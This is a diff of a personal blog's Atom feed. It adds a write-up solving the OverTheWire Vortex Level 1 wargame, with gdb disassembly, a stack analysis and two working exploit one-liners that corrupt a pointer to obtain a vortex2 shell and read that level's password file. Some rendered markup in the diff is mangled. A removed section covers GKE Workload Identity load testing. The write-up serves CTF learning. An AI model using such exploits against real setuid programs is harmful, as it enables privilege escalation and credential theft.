@@ -4,7 +4,7 @@
   <title><![CDATA[Category: Programming & Software | David Xia]]></title>
   <link href="https://www.davidxia.com/categories/programming-and-software/atom.xml" rel="self"/>
   <link href="https://www.davidxia.com/"/>
-  <updated>2020-11-01T18:15:41-05:00</updated>
+  <updated>2020-12-25T20:36:26-05:00</updated>
   <id>https://www.davidxia.com/</id>
   <author>
     <name><![CDATA[David Xia]]></name>
@@ -12,6 +12,243 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[My Solution to Over the Wire Vortex Level 1 -> 2]]></title>
+    <link href="https://www.davidxia.com/2020/12/my-solution-to-over-the-wire-vortex-level-1-2/"/>
+    <updated>2020-12-25T20:21:28-05:00</updated>
+    <id>https://www.davidxia.com/2020/12/my-solution-to-over-the-wire-vortex-level-1-2</id>
+    <content type="html"><![CDATA[<p>I recently found a whole new series of online wargames at [overthewire.org][].
+Here&rsquo;s my solution for the second level &ldquo;<a href="https://overthewire.org/wargames/vortex/vortex1.html">Vortex Level 1 -> Level 2</a>&rdquo;</p>
+
+<p>The levels are cumulative. We have to beat the previous level in order to access the next. This
+solution assumes we have solved &ldquo;<a href="https://overthewire.org/wargames/vortex/vortex0.html">Vortex Level 0 -> Level 1</a>&rdquo; and can SSH into the
+machine as user vortex1. Caveat: the machine is extremely slow&hellip;</p>
+
+<!-- more -->
+
+
+<p>First let&rsquo;s find out some information about the machine.</p>
+
+<pre><code>ssh vortex1@vortex.labs.overthewire.org -p 2228
+                 _
+__   _____  _ __| |_ _____  __
+\ \ / / _ \| '__| __/ _ \ \/ /
+ \ V / (_) | |  | ||  __/&gt;  &lt;
+  \_/ \___/|_|   \__\___/_/\_\
+
+a http://www.overthewire.org wargame.
+
+vortex1@vortex.labs.overthewire.org's password:
+Welcome to Ubuntu 14.04 LTS (GNU/Linux 4.4.0-92-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com/
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+</code></pre>
+
+<p>It&rsquo;s a machine running Ubuntu 14.04.</p>
+
+<pre><code>vortex1@vortex:~$ uname -i
+x86_64
+</code></pre>
+
+<p>It&rsquo;s a 64-bit system.</p>
+
+<pre><code>vortex1@vortex:~$ cat /proc/sys/kernel/randomize_va_space
+0
+</code></pre>
+
+<p>ASLR is disabled.</p>
+
+<pre><code>vortex1@vortex:~$ gdb /vortex/vortex1
+GNU gdb (Ubuntu 7.7.1-0ubuntu5~14.04.3) 7.7.1
+Copyright (C) 2014 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+&lt;http://www.gnu.org/software/gdb/bugs/&gt;.
+Find the GDB manual and other documentation resources online at:
+&lt;http://www.gnu.org/software/gdb/documentation/&gt;.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from /vortex/vortex1...(no debugging symbols found)...done.
+
+(gdb) set disassembly-flavor intel
+(gdb) set pagination off
+(gdb) disassemble main
+Dump of assembler code for function main:
+   0x080485c0 &lt;+0&gt;: push   ebp
+   0x080485c1 &lt;+1&gt;: mov    ebp,esp
+   0x080485c3 &lt;+3&gt;: push   esi
+   0x080485c4 &lt;+4&gt;: push   ebx
+   0x080485c5 &lt;+5&gt;: and    esp,0xfffffff0
+   0x080485c8 &lt;+8&gt;: sub    esp,0x220                  # Set stack pointer
+   0x080485ce &lt;+14&gt;:    mov    eax,gs:0x14
+   0x080485d4 &lt;+20&gt;:    mov    DWORD PTR [esp+0x21c],eax  
+   0x080485db &lt;+27&gt;:    xor    eax,eax
+   0x080485dd &lt;+29&gt;:    lea    eax,[esp+0x1c]
+   0x080485e1 &lt;+33&gt;:    add    eax,0x100                  # + (sizeof(buf) / 2)
+   0x080485e6 &lt;+38&gt;:    mov    DWORD PTR [esp+0x14],eax   # ptr is located at $esp + 0x14
+   0x080485ea &lt;+42&gt;:    jmp    0x804868e &lt;main+206&gt;
+   0x080485ef &lt;+47&gt;:    mov    eax,DWORD PTR [esp+0x18]
+   0x080485f3 &lt;+51&gt;:    cmp    eax,0xa
+   0x080485f6 &lt;+54&gt;:    je     0x80485ff &lt;main+63&gt;
+   0x080485f8 &lt;+56&gt;:    cmp    eax,0x5c
+   0x080485fb &lt;+59&gt;:    je     0x8048615 &lt;main+85&gt;
+   0x080485fd &lt;+61&gt;:    jmp    0x804861c &lt;main+92&gt;
+   0x080485ff &lt;+63&gt;:    mov    DWORD PTR [esp+0x4],0x200
+   0x08048607 &lt;+71&gt;:    lea    eax,[esp+0x1c]
+   0x0804860b &lt;+75&gt;:    mov    DWORD PTR [esp],eax
+   0x0804860e &lt;+78&gt;:    call   0x804856d &lt;print&gt;
+   0x08048613 &lt;+83&gt;:    jmp    0x804868e &lt;main+206&gt;
+   0x08048615 &lt;+85&gt;:    sub    DWORD PTR [esp+0x14],0x1
+   0x0804861a &lt;+90&gt;:    jmp    0x804868e &lt;main+206&gt;
+   0x0804861c &lt;+92&gt;:    mov    eax,DWORD PTR [esp+0x14]
+   0x08048620 &lt;+96&gt;:    and    eax,0xff000000
+   0x08048625 &lt;+101&gt;:   cmp    eax,0xca000000
+   0x0804862a &lt;+106&gt;:   jne    0x804866b &lt;main+171&gt;
+   0x0804862c &lt;+108&gt;:   call   0x8048430 &lt;geteuid@plt&gt;
+   0x08048631 &lt;+113&gt;:   mov    esi,eax
+   0x08048633 &lt;+115&gt;:   call   0x8048430 &lt;geteuid@plt&gt;
+   0x08048638 &lt;+120&gt;:   mov    ebx,eax
+   0x0804863a &lt;+122&gt;:   call   0x8048430 &lt;geteuid@plt&gt;
+   0x0804863f &lt;+127&gt;:   mov    DWORD PTR [esp+0x8],esi
+   0x08048643 &lt;+131&gt;:   mov    DWORD PTR [esp+0x4],ebx
+   0x08048647 &lt;+135&gt;:   mov    DWORD PTR [esp],eax
+   0x0804864a &lt;+138&gt;:   call   0x80483e0 &lt;setresuid@plt&gt;
+   0x0804864f &lt;+143&gt;:   mov    DWORD PTR [esp+0x8],0x0
+   0x08048657 &lt;+151&gt;:   mov    DWORD PTR [esp+0x4],0x804876a
+   0x0804865f &lt;+159&gt;:   mov    DWORD PTR [esp],0x804876d
+   0x08048666 &lt;+166&gt;:   call   0x8048420 &lt;execlp@plt&gt;
+   0x0804866b &lt;+171&gt;:   lea    eax,[esp+0x1c]
+   0x0804866f &lt;+175&gt;:   add    eax,0x200
+   0x08048674 &lt;+180&gt;:   cmp    DWORD PTR [esp+0x14],eax
+   0x08048678 &lt;+184&gt;:   jbe    0x804867c &lt;main+188&gt;
+   0x0804867a &lt;+186&gt;:   jmp    0x804868d &lt;main+205&gt;
+   0x0804867c &lt;+188&gt;:   mov    eax,DWORD PTR [esp+0x14]
+   0x08048680 &lt;+192&gt;:   lea    edx,[eax+0x1]
+   0x08048683 &lt;+195&gt;:   mov    DWORD PTR [esp+0x14],edx
+   0x08048687 &lt;+199&gt;:   mov    edx,DWORD PTR [esp+0x18]
+   0x0804868b &lt;+203&gt;:   mov    BYTE PTR [eax],dl
+   0x0804868d &lt;+205&gt;:   nop
+   0x0804868e &lt;+206&gt;:   call   0x8048400 &lt;getchar@plt&gt;
+   0x08048693 &lt;+211&gt;:   mov    DWORD PTR [esp+0x18],eax          # x is located at $esp + 0x18
+   0x08048697 &lt;+215&gt;:   cmp    DWORD PTR [esp+0x18],0xffffffff
+   0x0804869c &lt;+220&gt;:   jne    0x80485ef &lt;main+47&gt;
+   0x080486a2 &lt;+226&gt;:   mov    DWORD PTR [esp],0x8048775
+   0x080486a9 &lt;+233&gt;:   call   0x8048440 &lt;puts@plt&gt;
+   0x080486ae &lt;+238&gt;:   mov    eax,0x0
+   0x080486b3 &lt;+243&gt;:   mov    ecx,DWORD PTR [esp+0x21c]
+   0x080486ba &lt;+250&gt;:   xor    ecx,DWORD PTR gs:0x14
+   0x080486c1 &lt;+257&gt;:   je     0x80486c8 &lt;main+264&gt;
+   0x080486c3 &lt;+259&gt;:   call   0x8048410 &lt;__stack_chk_fail@plt&gt;
+   0x080486c8 &lt;+264&gt;:   lea    esp,[ebp-0x8]
+   0x080486cb &lt;+267&gt;:   pop    ebx
+   0x080486cc &lt;+268&gt;:   pop    esi
+   0x080486cd &lt;+269&gt;:   pop    ebp
+   0x080486ce &lt;+270&gt;:   ret
+End of assembler dump.
+</code></pre>
+
+<p>We can see that on main+8, the stack pointer <code>esp</code> is decreased by 0x220 to make room for <code>unsigned
+char buf[512]</code>, <code>unsigned char *ptr</code>, and <code>unsigned int x</code>. If we look more closely at the assembly,
+we can see <code>ptr</code> is located at <code>esp + 0x14</code> because the instruction before that increases <code>eax</code> by
+<code>0x100</code> or <code>(sizeof(buf) / 2)</code> or 256. <code>main+211</code> shows <code>x</code> is located right after <code>ptr</code> at <code>esp +
+0x18</code> since the instruction right before calls <code>getchar()</code>. This means <code>buf[512]</code> is after that and
+takes up the majority of the stack. So the stack layout is <code>ptr</code>, <code>x</code>, then <code>buf[512]</code>. This makes
+sense because the compiler on more modern systems will put buffers after other variables to protect
+against buffer overflows.</p>
+
+<p>Question: why is the size of <code>ptr</code> only 4 bytes? I thought on 64-bit systems pointer variables are 8
+bytes not 4 since memory should be 64-bit- or 8-byte-addressable?</p>
+
+<p>We set a breakpoint at the <code>getchar()</code> call and run the program. Examine the first 64 words of <code>esp</code>
+in hexadecimal.</p>
+
+<pre><code>(gdb) break *main+206
+Breakpoint 1 at 0x804868e
+
+(gdb) run
+Starting program: /vortex/vortex1
+
+Breakpoint 1, 0x0804868e in main ()
+
+(gdb) x/64wx $esp
+0xffffd4c0: 0xf7e303b4  0xf7fd81a8  0x00000000  0xf7fec4a8
+0xffffd4d0: 0x00000007  0xffffd5dc  0x00000001  0x00000000
+0xffffd4e0: 0x00000001  0xf7fd81a8  0xf7ffd000  0xf7fe6d3b
+0xffffd4f0: 0xf7ffc000  0x00001000  0x00000001  0xf7fe6cfc
+0xffffd500: 0xf7ffd000  0x00000000  0xffffd5c8  0xf7fe724b
+0xffffd510: 0xf7ffdaf0  0xf7fd8760  0x00000001  0x00000001
+0xffffd520: 0x00000000  0xf7ff578c  0x00000000  0x00000000
+0xffffd530: 0xf7ffd55c  0xffffd598  0xffffd5b8  0x00000000
+0xffffd540: 0xf7ff578c  0xf7ffd55c  0xffffd5b8  0xf7fdc4ac
+0xffffd550: 0xf7fdc2dc  0xf7fe4f3d  0xf7e36061  0x080482ff
+0xffffd560: 0x00000000  0xf7fdc33c  0x00000000  0xf7fdc000
+0xffffd570: 0x00000040  0x00000002  0x0804827d  0xf7ffdc24
+0xffffd580: 0xf7e226bc  0xf7ffd000  0xf7e26cc4  0x00000001
+0xffffd590: 0xf7fd8460  0xf7fe5694  0x00000000  0x00000000
+0xffffd5a0: 0x00000000  0x00000000  0xf7fd8460  0x00000003
+0xffffd5b0: 0xffffd5e0  0x07b1ea71  0xf63d4e2e  0xf7e26ed4
+</code></pre>
+
+<p><code>ptr</code> is located at <code>$esp + 0x14 = 0xffffd4d4</code> which is initialized with a value of <code>0xffffd5dc</code>.
+Since ASLR is disabled, this location is fixed.</p>
+
+<p>I first thought of a brute-force strategy of decrementing <code>ptr</code>&rsquo;s value with <code>\</code> until its highest
+byte was <code>0xca</code>. That way, when it&rsquo;s bit-wise ANDed with <code>0xff000000</code>, the result would be
+<code>0xca000000</code>. The exploit command would be the following.</p>
+
+<pre><code>(python -c 'import sys; sys.stdout.write("\\" * (0xffffe470-0xcaffffff) + "\x00")'; cat) \
+  | /vortex/vortex1
+</code></pre>
+
+<p>Aside: the Python command is run in a subshell with an extra <code>cat</code> to keep the <code>/bin/sh</code> listening
+to more input from the stdout of that subshell. That way we can add more commands from your
+terminal. The Python command triggers the <code>/bin/sh</code>. The <code>cat</code> with no args just reads from the
+current stdin and feeds data to <code>/bin/sh</code>. See this <a href="https://security.stackexchange.com/a/155845/4350">Stack Exchange answer</a>.</p>
+
+<p>This is most definitely not the &ldquo;right&rdquo; solution because 0xffffd5dc - 0xcaffffff = 0x34ffd5dd =
+889,181,661. If written to disk, this file be almost a gigabyte.</p>
+
+<p>Let&rsquo;s think of a better solution. There&rsquo;s no lower bound checking on <code>ptr</code>&rsquo;s value. So we can
+decrement the value of ptr until it references its own memory address which starts at <code>0xffffd4d4</code>.
+Then we write <code>0xca</code> into the highest byte at <code>0xffffd4d7</code>. <code>ptr</code>&rsquo;s value is initialized to
+<code>0xffffd5dc</code>. So we write this many <code>\</code>: 0xffffd5dc - 0xffffd4d7 = 0x105 = 261. Instead of the
+seemingly arbitrary 261, we&rsquo;ll use 512/2 + 5. This is more descriptive because it shows we&rsquo;re moving
+the <code>ptr</code> reference from where it starts in the middle of <code>buf[512]</code> back to the beginning and then
+past the <code>x</code> and one byte into itself.</p>
+
+<pre><code>(python -c 'import sys; sys.stdout.write("\\" * (512/2 + 5) + "\xca" + "A")'; cat) \
+  | /vortex/vortex1
+
+id
+uid=5002(vortex2) gid=5001(vortex1) groups=5002(vortex2),5001(vortex1)
+</code></pre>
+
+<p>The wargame instructions don&rsquo;t tell you this, but each user&rsquo;s password is located in the directory
+below. Now that we have a shell as vortex2, we can read the password to advance to the next level.</p>
+
+<pre><code>ls /etc/vortex_pass
+vortex0   vortex11  vortex14  vortex17  vortex2   vortex22  vortex25  vortex5  vortex8
+vortex1   vortex12  vortex15  vortex18  vortex20  vortex23  vortex3   vortex6  vortex9
+vortex10  vortex13  vortex16  vortex19  vortex21  vortex24  vortex4   vortex7
+
+cat /etc/vortex_pass/vortex2
+23anbT\rE
+</code></pre>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[My Solution to Exploit Exercises Protostar Final2 Level]]></title>
@@ -24,11 +261,7 @@ I&rsquo;ll write the explanation while it&rsquo;s still fresh in my head.</p>
 
 <p>The level&rsquo;s description is</p>
 
-<p>{% blockquote %}
-Remote heap level :)
-Core files will be in /tmp.
-This level is at /opt/protostar/bin/final2
-{% endblockquote %}</p>
+<p><blockquote><p>Remote heap level :)<br/>Core files will be in /tmp.<br/>This level is at /opt/protostar/bin/final2</p></blockquote></p>
 
 <!-- more -->
 
@@ -855,7 +1088,7 @@ settings.&rdquo;</p>
 <p>I made sure the traffic was proxied through my computer, the patched app started successfully, and I
 was able to see unencrypted data in Charles!</p>
 
-<p>{% img center <a href="https://i.imgur.com/e8p2Ne3h.jpg">https://i.imgur.com/e8p2Ne3h.jpg</a> %}</p>
+<p><img class="center <a" src="href="https://i.imgur.com/e8p2Ne3h.jpg">https://i.imgur.com/e8p2Ne3h.jpg</a>&#8221;></p>
 
 <h2>References</h2>
 
@@ -948,18 +1181,26 @@ information in a way that will allow arbitrary memory overwrites afterwards.</p>
 4 bytes each. <code>data</code> is the user data section. <code>malloc()</code> returns a pointer to the address where
 <code>data</code> starts.</p>
 
-<p>{% codeblock %}
-.            +&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+
-    chunk -> | prev_size                        |
-             +&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+
-             | size                             |
-             +&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+
-      mem -> | data                             |
-             : &hellip;                              :
-             +&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+
-nextchunk -> | prev_size &hellip;                    |
-             :                                  :
-{% endcodeblock %}</p>
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>.            +&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+
+</span><span class='line'>    chunk -> | prev_size                        |
+</span><span class='line'>             +&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+
+</span><span class='line'>             | size                             |
+</span><span class='line'>             +&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+
+</span><span class='line'>      mem -> | data                             |
+</span><span class='line'>             : &hellip;                              :
+</span><span class='line'>             +&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+
+</span><span class='line'>nextchunk -> | prev_size &hellip;                    |
+</span><span class='line'>             :                                  :</span></code></pre></td></tr></table></div></figure></p>
 
 <p>The other important things to know about the vulnerable version(s) of dlmalloc are:</p>
 
@@ -972,22 +1213,34 @@ pointer at <code>mem</code>.</li>
 </ul>
 
 
-<p>{% codeblock %}
-.            +&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+
-    chunk -> | prev_size                        |
-             +&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+
-             | size                             |
-             +&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+
-      mem -> | fd                               |
-             +&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+
-             | bk                               |
-             +&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+
-             | (old memory, can be zero bytes)  |
-             :                                  :</p>
-
-<p>nextchunk -> | prev_size &hellip;                    |
-             :                                  :
-{% endcodeblock %}</p>
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>.            +&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+
+</span><span class='line'>    chunk -> | prev_size                        |
+</span><span class='line'>             +&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+
+</span><span class='line'>             | size                             |
+</span><span class='line'>             +&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+
+</span><span class='line'>      mem -> | fd                               |
+</span><span class='line'>             +&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+
+</span><span class='line'>             | bk                               |
+</span><span class='line'>             +&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-+
+</span><span class='line'>             | (old memory, can be zero bytes)  |
+</span><span class='line'>             :                                  :&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>nextchunk -> | prev_size &hellip;                    |
+</span><span class='line'>             :                                  :</span></code></pre></td></tr></table></div></figure></p>
 
 <ul>
 <li>If neighboring chunks are free, dlmalloc will merge the just freed chunk with its neighboring
@@ -1984,480 +2237,6 @@ duration percentiles.</p>
 </code></pre>
 
 <p>Thanks to <a href="https://twitter.com/mikedanese">@mikedanese</a> for the intial idea of using <code>socat</code>.</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[3 Levels of Load Testing GKE Workload Identity]]></title>
-    <link href="https://www.davidxia.com/2020/04/3-levels-of-load-testing-gke-workload-identity/"/>
-    <updated>2020-04-01T10:21:11-04:00</updated>
-    <id>https://www.davidxia.com/2020/04/3-levels-of-load-testing-gke-workload-identity</id>
-    <content type="html"><![CDATA[<p>I manage multitenant <a href="https://cloud.google.com/kubernetes-engine">Google Kubernetes Engine</a> (GKE) clusters for stateless backend services at
-work. Google recently graduated GKE&rsquo;s <a href="https://cloud.google.com/kubernetes-engine/docs/how-to/workload-identity">Workload Identity</a> (WI) feature to generally available
-(GA). When my team used WI during its beta stage, it seemed to fail when there were more than 16
-requests per second (RPS) on one GKE node to retrieve Google access tokens.</p>
-
-<p>Before we knew about this low RPS failure threshold, we told many internal engineering teams
-to go ahead and use the feature. In hindsight, we should&rsquo;ve load-tested the feature before making it
-generally available internally especially since it wasn&rsquo;t even GA publicly.</p>
-
-<p>My efforts to load test WI have grown more sophisticated over time. This post describes the
-progression. It&rsquo;s like the &ldquo;4 Levels of &hellip;&rdquo; <a href="https://www.youtube.com/playlist?list=PLz3-p2q6vFYUDvVUu_aPhGUV-3ROIa6d2">Epicurious Youtube videos</a>. The goal here is to find
-out at what RPS WI starts to fail and to try to learn some generalizable lessons from load testing
-vendor-managed services.</p>
-
-<h3>tl;dr lessons learned</h3>
-
-<ul>
-<li>always load test new features above and beyond what you expect your production load will be</li>
-<li>use proper load testing tools and not bash for loops</li>
-</ul>
-
-
-<!-- more -->
-
-
-<h2>My specific GKE cluster configuration</h2>
-
-<ul>
-<li>GKE masters and nodes running version 1.15.9-gke.22</li>
-<li>regional cluster in Google Cloud Platform (GCP) (not on-premise)</li>
-<li>4 GKE nodes that are n1-standard-32 GCE instances in one node pool</li>
-<li>each node is configured to have a maximum of 32 Pods</li>
-<li>cluster and node pool have WI enabled</li>
-</ul>
-
-
-<h2>High level of what Workload Identity is and how it works</h2>
-
-<p>Workloads on GKE often need to access GCP resources like PubSub or CloudSQL.
-In order to do so, your workload needs to use a Google Service Account (GSA) key that is authorized to
-access those resources. So you end up creating keys for all your GSA&rsquo;s and copy-pasting
-these keys into Kubernetes Secrets for your workloads. This is insecure and not maintainable if you
-are a company that has dozens of engineering teams and hundreds of workloads.</p>
-
-<p>So GCP offered WI which allows a Kubernetes Service Account (KSA) to be associated with a GSA. If a
-workload can run with a certain KSA, it&rsquo;ll transparently get the Google access token for the
-associated GSA. No manual copy-pasting GSA keys!</p>
-
-<p>How does this work? You have to enable WI on your cluster and node pool. This creates a
-<code>gke-metadata-server</code> DaemonSet in the <code>kube-system</code> namespace. <code>gke-metadata-server</code> is the
-entrypoint to the whole WI system. Here&rsquo;s a nice <a href="https://www.youtube.com/watch?v=s4NYEJDFc0M">Google Cloud Next conference talk</a> with more
-details.</p>
-
-<p><code>gke-metadata-server</code> is the only part of WI that is exposed to GKE users, i.e. runs on machines you
-control. It&rsquo;s like the Verizon FiOS box in your basement. You control your house, but there&rsquo;s a
-little box that Verizon owns and operates in there. All other parts of WI run on GCP infrastructure
-that you can&rsquo;t see. When I saw failures with WI, it all seemed to happen in
-<code>gke-metadata-server</code>. So that&rsquo;s what I&rsquo;ll load test.</p>
-
-<p>Here&rsquo;s the <code>gke-metadata-server</code> DaemonSet YAML for reference. As of the time of this writing the
-image is <code>gke.gcr.io/gke-metadata-server:20200218_1145_RC0</code>. You might see different behavior with
-different images.</p>
-
-<pre><code>apiVersion: extensions/v1beta1
-kind: DaemonSet
-metadata:
-  creationTimestamp: "2019-10-15T17:04:40Z"
-  generation: 8
-  labels:
-    addonmanager.kubernetes.io/mode: Reconcile
-    k8s-app: gke-metadata-server
-  name: gke-metadata-server
-  namespace: kube-system
-  resourceVersion: "138588210"
-  selfLink: /apis/extensions/v1beta1/namespaces/kube-system/daemonsets/gke-metadata-server
-  uid: e06885d8-ef6d-11e9-88c9-42010a8c0110
-spec:
-  revisionHistoryLimit: 10
-  selector:
-    matchLabels:
-      k8s-app: gke-metadata-server
-  template:
-    metadata:
-      annotations:
-        components.gke.io/component-name: gke-metadata-server
-        components.gke.io/component-version: 0.2.21
-        scheduler.alpha.kubernetes.io/critical-pod: '"''"'
-      creationTimestamp: null
-      labels:
-        addonmanager.kubernetes.io/mode: Reconcile
-        k8s-app: gke-metadata-server
-    spec:
-      containers:
-      - command:
-        - /gke-metadata-server
-        - --logtostderr
-        - --token-exchange-endpoint=https://securetoken.googleapis.com/v1/identitybindingtoken
-        - --identity-namespace=[redacted].svc.id.goog
-        - --identity-provider-id=https://container.googleapis.com/v1/projects/[redacted]/locations/asia-east1/clusters/[redacted]
-        - --passthrough-ksa-list=kube-system:container-watcher-pod-reader,kube-system:event-exporter-sa,kube-system:fluentd-gcp-scaler,kube-system:heapster,kube-system:kube-dns,kube-system:metadata-agent,kube-system:network-metering-agent,kube-system:securityprofile-controller,istio-system:istio-ingressgateway-service-account,istio-system:cluster-local-gateway-service-account,csm:csm-sync-agent,knative-serving:controller
-        - --attributes=cluster-name=[redacted],cluster-uid=[redacted],cluster-location=asia-east1
-        - --enable-identity-endpoint=true
-        - --cluster-uid=[redacted]
-        image: gke.gcr.io/gke-metadata-server:20200218_1145_RC0
-        imagePullPolicy: IfNotPresent
-        livenessProbe:
-          failureThreshold: 3
-          httpGet:
-            host: 127.0.0.1
-            path: /healthz
-            port: 54898
-            scheme: HTTP
-          initialDelaySeconds: 10
-          periodSeconds: 10
-          successThreshold: 1
-          timeoutSeconds: 1
-        name: gke-metadata-server
-        resources:
-          limits:
-            cpu: 100m
-            memory: 100Mi
-          requests:
-            cpu: 100m
-            memory: 100Mi
-        securityContext:
-          privileged: true
-        terminationMessagePath: /dev/termination-log
-        terminationMessagePolicy: File
-        volumeMounts:
-        - mountPath: /var/lib/kubelet/kubeconfig
-          name: kubelet-credentials
-          readOnly: true
-        - mountPath: /var/lib/kubelet/pki/
-          name: kubelet-certs
-          readOnly: true
-        - mountPath: /var/run/
-          name: container-runtime-interface
-        - mountPath: /etc/srv/kubernetes/pki
-          name: kubelet-pki
-          readOnly: true
-        - mountPath: /etc/ssl/certs/
-          name: ca-certificates
-          readOnly: true
-      dnsPolicy: Default
-      hostNetwork: true
-      nodeSelector:
-        beta.kubernetes.io/os: linux
-        iam.gke.io/gke-metadata-server-enabled: "true"
-      priorityClassName: system-node-critical
-      restartPolicy: Always
-      schedulerName: default-scheduler
-      securityContext: {}
-      serviceAccount: gke-metadata-server
-      serviceAccountName: gke-metadata-server
-      terminationGracePeriodSeconds: 30
-      tolerations:
-      - effect: NoExecute
-        operator: Exists
-      - effect: NoSchedule
-        operator: Exists
-      volumes:
-      - hostPath:
-          path: /var/lib/kubelet/pki/
-          type: Directory
-        name: kubelet-certs
-      - hostPath:
-          path: /var/lib/kubelet/kubeconfig
-          type: File
-        name: kubelet-credentials
-      - hostPath:
-          path: /var/run/
-          type: Directory
-        name: container-runtime-interface
-      - hostPath:
-          path: /etc/srv/kubernetes/pki/
-          type: Directory
-        name: kubelet-pki
-      - hostPath:
-          path: /etc/ssl/certs/
-          type: Directory
-        name: ca-certificates
-  templateGeneration: 8
-  updateStrategy:
-    rollingUpdate:
-      maxUnavailable: 1
-    type: RollingUpdate
-</code></pre>
-
-<h2>Level 1</h2>
-
-<p>What kind of load am I putting on <code>gke-metadata-server</code>? Since this DaemonSet exists to give out
-Google access tokens, I&rsquo;ll send it HTTP requests asking for such tokens.</p>
-
-<p>I built a Docker image with the following <code>Dockerfile</code>.</p>
-
-<pre><code>FROM google/cloud-sdk
-ENTRYPOINT while true; do for i in {1..20}; do curl -X GET https://www.googleapis.com/oauth2/v3/tokeninfo?access_token=$(gcloud auth print-access-token) &amp; done; wait; done;
-</code></pre>
-
-<p>Then I created the following K8s Deployment YAML.</p>
-
-<pre><code class="yaml">apiVersion: apps/v1
-kind: Deployment
-metadata:
-  name: wi-test
-  namespace: [K8S_NAMESPACE]
-spec:
-  replicas: 7
-  selector:
-    matchLabels:
-      app: wi-test
-  template:
-    metadata:
-      labels:
-        app: wi-test
-    spec:
-      nodeSelector:
-        kubernetes.io/hostname: [NODE-NAME]
-      containers:
-      - image: my-docker-image
-        name: workload-identity-test
-</code></pre>
-
-<p>I ran seven of these Pods on a single node (see the <code>nodeSelector</code> above) to target a single
-instance of <code>gke-metadata-server</code>.</p>
-
-<p>This isn&rsquo;t a great test because there&rsquo;s a lot of extra work performed by the Container in running
-<code>gcloud</code> to print a Google access token (there may be bottlenecks in this <code>gcloud</code> command itself
-which is Python code), curling the <code>googleapis.com</code> endpoint to get the token info (originally done
-to verify the token was valid). And there&rsquo;s probably bottlenecks in using a shell to do this. All in
-all, this implementation doesn&rsquo;t really let you specify a fixed RPS. You&rsquo;re at the mercy of how fast
-your Container, shell, gcloud, and the network will let you execute this. I also wasn&rsquo;t able to run
-more Pods on a single node because I was hitting the max 32 pods per node limit. There were already
-a bunch of other GKE-system level workloads like Calico that took up node capacity.</p>
-
-<h2>Level 2</h2>
-
-<p>Apply this one Pod</p>
-
-<pre><code>cat &lt;&lt;EOF | kubectl --context [CONTEXT] apply -f -
-apiVersion: v1
-kind: Pod
-metadata:
-  name: wi-test
-  namespace: [K8S_NAMESPACE]
-spec:
-  containers:
-  - image: google/cloud-sdk
-    name: wi-test
-    command: [ '/bin/bash', '-c', '--' ]
-    args: [ 'while true; do sleep 30; done;' ]
-    securityContext:
-      allowPrivilegeEscalation: false
-      privileged: false
